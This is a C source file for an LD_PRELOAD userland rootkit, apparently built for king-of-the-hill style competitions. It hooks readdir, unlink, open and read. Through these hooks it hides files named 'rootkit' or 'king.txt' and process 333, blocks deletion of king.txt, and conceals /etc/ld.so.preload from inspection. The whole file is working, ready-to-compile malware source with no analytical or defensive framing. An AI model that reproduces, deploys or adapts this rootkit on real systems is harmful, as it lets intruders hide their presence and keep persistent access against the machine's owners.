#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>

// AUTHOR: @profxadke (Nikhil Aryal)

// Function pointers for original system calls
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static int (*orig_unlink)(const char *pathname) = NULL;
static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;

// Intercept readdir to hide specific processes and files
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide files/directories containing "rootkit" or "king.txt"
        if (strstr(entry->d_name, "rootkit") == NULL && strstr(entry->d_name, "king.txt") == NULL) {
            // Hide process with a specific PID (e.g., 333)
            if (strcmp(entry->d_name, "333") == 0) {
                continue;
            }
            return entry;
        }
    }
    return NULL;
}

// Intercept unlink to protect specific files
int unlink(const char *pathname) {
    if (!orig_unlink) {
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    // Protect "king.txt" from being deleted
    if (strstr(pathname, "king.txt") != NULL) {
        errno = EACCES;
        return -1;
    }
    return orig_unlink(pathname);
}

// Intercept open to hide specific files
int open(const char *pathname, int flags, ...) {
    if (!orig_open) {
        orig_open = dlsym(RTLD_NEXT, "open");
    }

    // Hide the file descriptor for /etc/ld.so.preload
    if (strcmp(pathname, "/etc/ld.so.preload") == 0) {
        errno = EACCES; // Return permission error to prevent opening the file
        return -1;
    }

    return orig_open(pathname, flags);
}

// Intercept read to hide content of specific files
ssize_t read(int fd, void *buf, size_t count) {
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    // Hide content if file descriptor corresponds to /etc/ld.so.preload
    char pathname[256];
    snprintf(pathname, sizeof(pathname), "/proc/self/fd/%d", fd);
    char real_path[256];
    ssize_t len = readlink(pathname, real_path, sizeof(real_path) - 1);
    if (len != -1) {
        real_path[len] = '\0';
        if (strcmp(real_path, "/etc/ld.so.preload") == 0) {
            return 0; // Return zero bytes to hide the content
        }
    }

    return orig_read(fd, buf, count);
}
